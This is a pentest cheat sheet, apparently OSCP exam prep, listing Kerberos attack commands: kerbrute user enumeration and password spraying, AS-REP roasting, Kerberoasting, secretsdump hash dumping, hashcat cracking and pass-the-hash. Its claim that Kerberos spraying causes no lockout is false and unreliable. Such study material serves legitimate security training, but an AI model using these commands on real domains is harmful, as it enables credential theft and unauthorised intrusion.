# Kerberos

### Port: 88

## Service Usage

Rare on current OSCP (AD-only boxes). Keep this lean.
Validate users via kerbrute
```bash
kerbrute userenum -d $domain --dc $ip users.txt
```
Password spray via kerbrute
```bash
kerbrute passwordspray -d $domain --dc $ip users.txt 'Spring2026!'
```
Get a TGT if you have creds and a clock-synced box
```bash
impacket-getTGT $domain/$un:$pw
```

## 0. Fast Path (try these first)

User enumeration (no creds, works if pre-auth is off)
```bash
kerbrute userenum -d $domain --dc $ip users.txt
```
AS-REP roast (harvest crackable hashes if pre-auth disabled)
```bash
impacket-GetNPUsers $domain/ -usersfile users.txt -dc-ip $ip -no-pass
```

## 1. Banner Grab & Unauthenticated Enumeration

Port and service scan
```bash
nmap -p 88 -sV -sC $ip
```

## 2. Authenticated Enumeration

Kerberoast (request SPNs) with creds
```bash
impacket-GetUserSPNs $domain/$un:$pw -dc-ip $ip
```
AS-REP roast with creds
```bash
impacket-GetNPUsers $domain/$un:$pw -dc-ip $ip
```
Dump secrets (NTLM hashes) with creds
```bash
impacket-secretsdump $domain/$un:$pw@$ip
```

## 3. Password Spraying / Bruteforcing

Password spray (Kerberos is clean for this — no lockout)
```bash
kerbrute passwordspray -d $domain --dc $ip users.txt 'Spring2026!'
```

## 5. Quick Wins

### 5.1 AS-REP roast → crack
```bash
impacket-GetNPUsers $domain/ -usersfile users.txt -dc-ip $ip -no-pass -format hashcat > asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt
```

### 5.2 Kerberoast → crack
```bash
impacket-GetUserSPNs $domain/$un:$pw -dc-ip $ip -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt wordlist.txt
```

### 5.3 Clock skew fix (KRB_AP_ERR_SKEW)
```bash
sudo ntpdate $ip        # or rdate, or manually set date
```

## 6. Config Paths

krb5 client
```text
/etc/krb5.conf
```
KDC
```text
/etc/krb5kdc/kdc.conf
```

## 7. Post-Exploit / Pivot

- Cracked hashes → creds → reuse across services
- Domain creds → secretsdump → NTLM hashes → pass-the-hash (see SMB/WinRM notes)

### Common gotchas
```text
- Clock must be within ~5 min of the DC or you'll get KRB_AP_ERR_SKEW. Sync it.
- Kerberoast needs a domain user; AS-REP roast works with zero creds if pre-auth is off.
- Kerberos on OSCP = optional bonus. If you see 88 but no AD context, don't rabbit-hole.
```